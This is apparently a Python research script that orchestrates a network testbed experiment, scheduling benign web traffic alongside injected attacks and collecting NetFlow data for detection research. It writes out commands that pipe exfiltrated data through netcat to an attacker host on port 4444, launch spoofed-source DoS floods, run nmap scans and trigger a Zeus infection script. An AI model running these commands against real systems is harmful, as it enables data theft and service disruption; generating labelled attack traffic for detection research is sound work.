#!/usr/bin/python
# -*- coding: cp1252 -*-

# Autor: Gabriel Maciá
# Fecha: 23/12/2015


from lib.VeritasExperiment import VeritasExperiment
import time
import sys

NOMBRE_EXPERIMENTO = 'jerarquico3'
DIR_RESULTADOS = NOMBRE_EXPERIMENTO + time.strftime('.%y%m%d%H%M')
CD_WORK_DIR = 'cd git/VERITASExperimentalScripts'



######### COMANDOS DE EJECUCIÓN ########################################
# El formato de la lista de comandos es: [tInicio, comando]

def activarNetflowRouters (tInicial):

    ACTIVATE_NETFLOW = CD_WORK_DIR + '/machines/routers/scripts/; sudo ./activateNetflow.sh'
    NFCAPD_CAPTURAS = CD_WORK_DIR + '/machines/routers/capturas; '

    comandos  = [
                        [tInicial, 'ssh nesg@routerR1 "' + NFCAPD_CAPTURAS + 'rm nfcapd*"'], #Borra los ficheros antiguos 
                        [tInicial, 'ssh nesg@routerR2 "' + NFCAPD_CAPTURAS + 'rm nfcapd*"'], 
                        [tInicial, 'ssh nesg@routerR3 "' + NFCAPD_CAPTURAS + 'rm nfcapd*"'], 
                        [tInicial, 'ssh nesg@borderRouter "' + NFCAPD_CAPTURAS + 'rm nfcapd*"'], 
                        [tInicial+1, 'ssh nesg@routerR1 "' + ACTIVATE_NETFLOW + '"'], #Activa NETFLOW
                        [tInicial+1, 'ssh nesg@routerR2 "' + ACTIVATE_NETFLOW + '"'],
                        [tInicial+1, 'ssh nesg@routerR3 "' + ACTIVATE_NETFLOW + '"'],
                        [tInicial+1, 'ssh nesg@borderRouter "' + ACTIVATE_NETFLOW + '"']
                    ]
    return comandos


def tonteria (tInicial):
    comandos = [
                [tInicial, 'ssh nesg@routerR1 "hostname; sleep 30"; echo terminada la siesta de 30s']
                
                ]
    return comandos


def traficoHttp (tInicial, duracion, origen, destino, nClientes):

    TRAFFIC_GENERATOR = CD_WORK_DIR + '/machines/clients/scripts/; ./trafficGenerator.py '
    
    if destino!='wwwserver' and destino!='dmz':
        destino = 'wwwserver'
    comandos = [ 
                [tInicial, 'ssh nesg@' + origen + ' "' + TRAFFIC_GENERATOR + ' -n ' + str(nClientes) + 
                 ' -t ' + str(duracion) + ' -d ' + destino +'.txt > tmp.txt"'],
            ]    
    return comandos

def iniciarSensores(tInicial):

    SENSOR_EXEC = CD_WORK_DIR + '/machines/MSNMsensor/scripts/; ./start.sh'
    
    comandos = [ 
                [tInicial, 'ssh nesg@routerR1 "' + SENSOR_EXEC + '"'],
		[tInicial, 'ssh nesg@routerR2 "' + SENSOR_EXEC + '"'],
		[tInicial, 'ssh nesg@routerR3 "' + SENSOR_EXEC + '"'],
		[tInicial, 'ssh nesg@borderRouter "' + SENSOR_EXEC + '"'],
            ]    
    return comandos

def exfiltracion (tInicial, duracion, origen, destino_nombre, destino_ipinterna):
    EXFILTRATION = CD_WORK_DIR + '/attacks; ./informationExfiltrated.py '
    if destino_ipinterna == '10.0.0.2': #Maquina kali linux con otra sintaxis
        nc = 'nc -l -p 4444'
    else: 
        nc = 'nc -l 4444'
        
    comandos = [
                    [tInicial, 'ssh nesg@' + destino_nombre +' "' + nc + ' > tmp.txt"'],
                    [tInicial+2, 'ssh nesg@' + origen + ' "' + EXFILTRATION + '| nc ' + destino_ipinterna + ' 4444"'],
                    [tInicial+duracion, 'ssh nesg@'+ destino_nombre + ' "killall nc"']
                ]
    return comandos


def DoS (tInicial, duracion, speed, origen, destino, spoofingIP):

    # Nota: Para diferenciar el trafico DoS de otro de clientes desde la misma maquina, se da la opcion de hacer spoofing para el 
    # trafico DoS. Ahora bien, la direccion elegida debe estar en la misma subred que la maquina origen para que netflow capture
    # el trafico ACK y lo registre. 
    DOS = CD_WORK_DIR + '/attacks; sudo ./DoSattack.py '
    if (speed != 'fast' and speed != 'faster'):
            speed = 'faster'
    comandos = [
                  [tInicial, 'ssh nesg@' + origen + ' "' + DOS + ' --speed ' + speed + ' -s ' + spoofingIP + ' ' + destino + ' > tmp.log"'],
                  [tInicial+duracion, 'ssh nesg@' + origen + ' "sudo killall hping3"']
            ]
    return comandos

def nmapAttack (tInicial, duracion, origen, destino, interval):
    NMAP = CD_WORK_DIR + '/attacks; ./nmapGenerator.py '
    comandos = [
                [tInicial, 'ssh nesg@' + origen + ' "' + NMAP + '-i ' + str(interval) + ' -d ' + str(duracion) + ' ' + destino + '>tmp.log"']
            ]
    return comandos

def zeusAttack (tInicial, origen):
    comandos = [
                [tInicial, 'ssh nesg@' + origen + ' "cd \ && infect.py"'],
            ]
    return comandos
######### COMANDOS DE PROCESADO ########################################
# En estos comandos el tiempo de inicio da igual, ya que se ejecutan secuencialmente uno después del otro. Por esto están todos a 0. 

def desactivarNetflowRouters (): 
    DEACTIVATE_NETFLOW = CD_WORK_DIR + '/machines/routers/scripts/; sudo ./deactivateNetflow.sh'
    comandos = [
                [0, 'ssh nesg@routerR1 "' + DEACTIVATE_NETFLOW + '"'],
                [0, 'ssh nesg@routerR2 "' + DEACTIVATE_NETFLOW + '"'],
                [0, 'ssh nesg@routerR3 "' + DEACTIVATE_NETFLOW + '"'],
                [0, 'ssh nesg@borderRouter "' + DEACTIVATE_NETFLOW + '"'] 
            ]
    return comandos

def pararSensores():

    SENSOR_EXEC = CD_WORK_DIR + '/machines/MSNMsensor/scripts/; ./stop.sh'
    
    comandos = [ 
                [0, 'ssh nesg@routerR1 "' + SENSOR_EXEC + '"'],
		[0, 'ssh nesg@routerR2 "' + SENSOR_EXEC + '"'],
		[0, 'ssh nesg@routerR3 "' + SENSOR_EXEC + '"'],
		[0, 'ssh nesg@borderRouter "' + SENSOR_EXEC + '"'],
            ]    
    return comandos

def collectSNMP_ifInOctects():
    comandos = [
                [0, 'ssh nesg@routerR1 "snmpdelta -v1 -cpublic -Cp 15 localhost .1.3.6.1.2.1.2.2.1.10.2"']
                
                ]

def copiarFicherosNfcapd ():

    comandos = [
                    [0, 'ssh nesg@routerR1 "' + CD_WORK_DIR + '/machines/routers/scripts; ./renameCaptureFiles.sh"'],    
                    [0, 'ssh nesg@routerR2 "' + CD_WORK_DIR + '/machines/routers/scripts; ./renameCaptureFiles.sh"'],    
                    [0, 'ssh nesg@routerR3 "' + CD_WORK_DIR + '/machines/routers/scripts; ./renameCaptureFiles.sh"'],    
                    [0, 'ssh nesg@borderRouter "' + CD_WORK_DIR + '/machines/routers/scripts; ./renameCaptureFiles.sh"'],    
                    [0, 'mkdir ../resultados/' + DIR_RESULTADOS], #Crea el directorio para almacenar las trazas
                    [0, 'cd ../resultados/' + DIR_RESULTADOS + '; mkdir borderRouter routerR1 routerR2 routerR3'],
                    [0, 'scp nesg@routerR1:~/git/VERITASExperimentalScripts/machines/routers/capturas/nfcapd* ../resultados/' + DIR_RESULTADOS + '/routerR1'],
                    [0, 'scp nesg@routerR2:~/git/VERITASExperimentalScripts/machines/routers/capturas/nfcapd* ../resultados/' + DIR_RESULTADOS + '/routerR2'],
                    [0, 'scp nesg@routerR3:~/git/VERITASExperimentalScripts/machines/routers/capturas/nfcapd* ../resultados/' + DIR_RESULTADOS + '/routerR3'],
                    [0, 'scp nesg@borderRouter:~/git/VERITASExperimentalScripts/machines/routers/capturas/nfcapd* ../resultados/' + DIR_RESULTADOS + '/borderRouter']
                ]
    return comandos

def procesaNfdump ():
    comandos = [
                 [0, 'cd ../resultados/' + DIR_RESULTADOS +'; nfdump -R borderRouter -q -o csv > borderRouter.csv'],
                 [0, 'cd ../resultados/' + DIR_RESULTADOS +'; nfdump -R routerR1 -q -o csv > routerR1.csv'],
                 [0, 'cd ../resultados/' + DIR_RESULTADOS +'; nfdump -R routerR2 -q -o csv > routerR2.csv'],
                 [0, 'cd ../resultados/' + DIR_RESULTADOS +'; nfdump -R routerR3 -q -o csv > routerR3.csv'],
            ]
    return comandos

def plotNfdump ():
    comandos = [
                [0, 'cd ../resultados/' + DIR_RESULTADOS + '; ../../scripts/plot.py *.csv']
            ]
    return comandos

def spoofIPs (ipOrigen, ipsDestino, size, rango): ## Si el rango es de privadas poner solo una cadena vacia
    SPOOF = 'cd ../resultados/' + DIR_RESULTADOS + '; ../../scripts/spoofIP.py '

    if ipsDestino != 'private' and ipsDestino != 'public':
        ipsDestino == 'public'  # Valor por defecto
    comandos = [
                [0, SPOOF + '-f routerR1 -t ' + ipsDestino + ' -s ' + ipOrigen + ' -n ' + str(size) + ' -r ' + rango],
                [0, SPOOF + '-f routerR2 -t ' + ipsDestino + ' -s ' + ipOrigen + ' -n ' + str(size) + ' -r ' + rango],
                [0, SPOOF + '-f routerR3 -t ' + ipsDestino + ' -s ' + ipOrigen + ' -n ' + str(size) + ' -r ' + rango],
                [0, SPOOF + '-f borderRouter -t ' + ipsDestino + ' -s ' + ipOrigen + ' -n ' + str(size) + ' -r ' + rango],
            ]
    return comandos
##########################################

###################################################################
### CREACIÓN DE ESCENARIOS
###################################################################

escenario1_ejecucion = (
                          activarNetflowRouters(0) + 
                          # Arranque del trafico normal 
                          traficoHttp(5, 90*60, 'm1.2', 'wwwserver', 30) + 
                          traficoHttp(5, 90*60, 'm2.2', 'wwwserver', 30) + 
                          traficoHttp(5, 90*60, 'm3.2', 'wwwserver', 30) +
                          traficoHttp(8, 90*60, 'm1.2', 'dmz', 10) + 
                          traficoHttp(8, 90*60, 'm2.2', 'dmz', 10) + 
                          traficoHttp(8, 90*60, 'm3.2', 'dmz', 10) + 
                              
                          #Ataques 
                          DoS(20*60, 5*60, 'faster', 'm3.2', '172.16.0.4', '192.168.3.8') + 
                          exfiltracion(30*60, 5*60, 'm2.2', 'atacante', '10.0.0.2') + 
                          nmapAttack(40*60, 20*60, 'm1.2', '172.16.0.254', 3) +
                          zeusAttack(65*60, 'm1.1') +                             
                          zeusAttack(65*60, 'm2.1') +                             
                          zeusAttack(65*60, 'm3.1') + 
                          DoS(70*60, 5*60, 'fast', 'm1.2', '172.16.0.4', '192.168.1.8') + 
                          DoS(70*60, 5*60, 'fast', 'm2.2', '172.16.0.4', '192.168.2.8') + 
                             
                          # Trafico más bajo de lo normal
                          traficoHttp(90*60, 30*60, 'm1.2', 'wwwserver', 30) + 
                          traficoHttp(90*60, 30*60, 'm2.2', 'wwwserver', 30) + 
                          traficoHttp(91*60, 30*60, 'm1.2', 'dmz', 10) + 
                          traficoHttp(91*60, 30*60, 'm2.2', 'dmz', 10) + 
                             
                          #Trafico ahora normal
                          traficoHttp(105*60, 15*60, 'm3.2', 'wwwserver', 30) + 
                          traficoHttp(106*60, 14*60, 'm3.2', 'dmz', 10) 
                             
                    )

# escenario1_ejecucion = (
#                            activarNetflowRouters(0) + 
#                           # exfiltracion(5, 40, 'm2.2', 'atacante', '10.0.0.2') +    
#                            #nmapAttack(5, 10, 'm1.2', '172.16.0.254', 15)                                                 
#                           # traficoHttp(3, 3*60, 'm3.2', 'wwwserver', 1) +
#                           #zeusAttack(6, 'm1.1') +                             
#                           #zeusAttack(6, 'm2.1') +                             
#                           #zeusAttack(6, 'm3.1') 
#                            
#                            traficoHttp(3, 60, 'm1.2', 'dmz', 30) + 
#                            DoS(20, 20, 'faster', 'm3.2', '172.16.0.4', '192.168.3.8')
#                              
#                          )

escenario1_procesado = (
                          desactivarNetflowRouters() + 
                          copiarFicherosNfcapd() + 
                          procesaNfdump() +
                        spoofIPs('192.168.3.8', 'private', 200, '192.168.3.') +
                        spoofIPs('192.168.2.8', 'public', 1000, 'x') +
                        spoofIPs('192.168.1.8', 'public', 1000, 'x') +
                        spoofIPs('192.168.1.2', 'private', 30, '192.168.1.') +
                        spoofIPs('192.168.2.2', 'private', 30, '192.168.2.') +
                        spoofIPs('192.168.3.2', 'private', 30, '192.168.3.') +
                        spoofIPs('10.0.0.1', 'public', 100, 'x') +
                          plotNfdump()
                          )

jerarquico_ejecucion = (
                          activarNetflowRouters(0) + 
                          traficoHttp(5, 30*60, 'm1.2', 'wwwserver', 30) + 
                          traficoHttp(5, 30*60, 'm2.2', 'wwwserver', 30) + 
                          traficoHttp(5, 30*60, 'm3.2', 'wwwserver', 30) +
                          traficoHttp(8, 30*60, 'm1.2', 'dmz', 10) + 
                          traficoHttp(8, 30*60, 'm2.2', 'dmz', 10) + 
                          traficoHttp(8, 30*60, 'm3.2', 'dmz', 10) +                         
                          DoS(10*60, 5*60, 'faster', 'm3.2', '172.16.0.4', '192.168.3.8') + 
                          DoS(20*60, 5*60, 'fast', 'm3.2', '172.16.0.4', '192.168.3.8')
                        )

# jerarquico_ejecucion = (
#                           traficoHttp(5, 3*60, 'm1.2', 'wwwserver', 30) + 
#                           traficoHttp(8, 3*60, 'm1.2', 'dmz', 10) 
#                         )

jerarquico_procesado = (
                          desactivarNetflowRouters() + 
                          copiarFicherosNfcapd() + 
                          procesaNfdump() +
                        spoofIPs('192.168.3.8', 'private', 200, '192.168.3.') +
                        #spoofIPs('192.168.2.8', 'public', 1000, 'x') +
                        #spoofIPs('192.168.1.8', 'public', 1000, 'x') +
                        spoofIPs('192.168.1.2', 'private', 30, '192.168.1.') +
                        spoofIPs('192.168.2.2', 'private', 30, '192.168.2.') +
                        spoofIPs('192.168.3.2', 'private', 30, '192.168.3.') +
                          spoofIPs('10.0.0.1', 'public', 100, 'x') +
                          plotNfdump()                        
                        
                        )

jerarquico_calibracion_ejecucion = (
                          activarNetflowRouters(0) + 
                          traficoHttp(5, 60*60, 'm1.2', 'wwwserver', 30) + 
                          traficoHttp(5, 60*60, 'm2.2', 'wwwserver', 30) + 
                          traficoHttp(5, 60*60, 'm3.2', 'wwwserver', 30) +
                          traficoHttp(8, 60*60, 'm1.2', 'dmz', 10) + 
                          traficoHttp(8, 60*60, 'm2.2', 'dmz', 10) + 
                          traficoHttp(8, 60*60, 'm3.2', 'dmz', 10) 
                        )


jerarquico_calibracion_procesado = (
                          desactivarNetflowRouters() + 
                          copiarFicherosNfcapd() + 
                          procesaNfdump() +
                          spoofIPs('192.168.1.2', 'private', 30, '192.168.1.') +
                          spoofIPs('192.168.2.2', 'private', 30, '192.168.2.') +
                          spoofIPs('192.168.3.2', 'private', 30, '192.168.3.') +
                          spoofIPs('10.0.0.1', 'public', 100, 'x') +
                          plotNfdump()                        
                        
                        )

jerarquico3_ejecucion = (
						# T=0 - Inicio tráfico web normal (duración 25*60*60+3*60)
						# T=1d0h02m - 24*60*60+2*60 - Inicio ataque DoS alta tasa (5 min)
						# T=1d0h17m - 24*60*60+2*60+15*60 - Inicio ataque DoS baja tasa (5 min)
						# T=1d0h32m - 24*60*60+2*60+30*60 - Inicio nmap (no mas de 5 min)
						# T=1d0h47m - 24*60*60+2*60+45*60 - Inicio exfiltracion 4444 (5 min)
						# T=1d1h03m - 25*60*60+3*60		  - Fin 
                          activarNetflowRouters(0) + 
			  iniciarSensores(1) +
                          traficoHttp(5, 25*60*60+3*60, 'm1.2', 'wwwserver', 30) + 
                          traficoHttp(5, 25*60*60+3*60, 'm2.2', 'wwwserver', 30) + 
                          traficoHttp(5, 25*60*60+3*60, 'm3.2', 'wwwserver', 30) +
                          traficoHttp(8, 25*60*60+3*60, 'm1.2', 'dmz', 10) + 
                          traficoHttp(8, 25*60*60+3*60, 'm2.2', 'dmz', 10) + 
                          traficoHttp(8, 25*60*60+3*60, 'm3.2', 'dmz', 10) + 			                          
                          DoS(24*60*60+2*60, 5*60, 'faster', 'm3.2', '172.16.0.4', '192.168.3.8') + 
                          DoS(24*60*60+2*60+15*60, 5*60, 'fast', 'm3.2', '172.16.0.4', '192.168.3.8') + 
                          nmapAttack(24*60*60+2*60+30*60, 5*60, 'm1.2', '172.16.0.254', 3) +
                          exfiltracion(24*60*60+2*60+45*60, 5*60, 'm2.2', 'atacante', '10.0.0.2')
                        )
                        
                        
jerarquico3_procesado = (
                          desactivarNetflowRouters() + 
			  pararSensores() +
                          copiarFicherosNfcapd() + 
                          procesaNfdump() +
                        spoofIPs('192.168.3.8', 'private', 200, '192.168.3.') +  #Trafico DoS se hace spoofing en la red. 
                        #spoofIPs('192.168.2.8', 'public', 1000, 'x') +
                        #spoofIPs('192.168.1.8', 'public', 1000, 'x') +
                        spoofIPs('192.168.1.2', 'private', 30, '192.168.1.') +
                        spoofIPs('192.168.2.2', 'private', 30, '192.168.2.') +
                        spoofIPs('192.168.3.2', 'private', 30, '192.168.3.') +
                          spoofIPs('10.0.0.1', 'public', 100, 'x') +
                          plotNfdump()                        
                        
                        )                    

if __name__ == '__main__':

    comandos_ejecucion = jerarquico3_ejecucion
    comandos_procesado = jerarquico3_procesado    
    e = VeritasExperiment (NOMBRE_EXPERIMENTO)
    e.insertaListaComandosEjecucion(comandos_ejecucion)
    e.insertaListaComandosProcesado(comandos_procesado)
    e.imprimeComandos()
    e.execute()
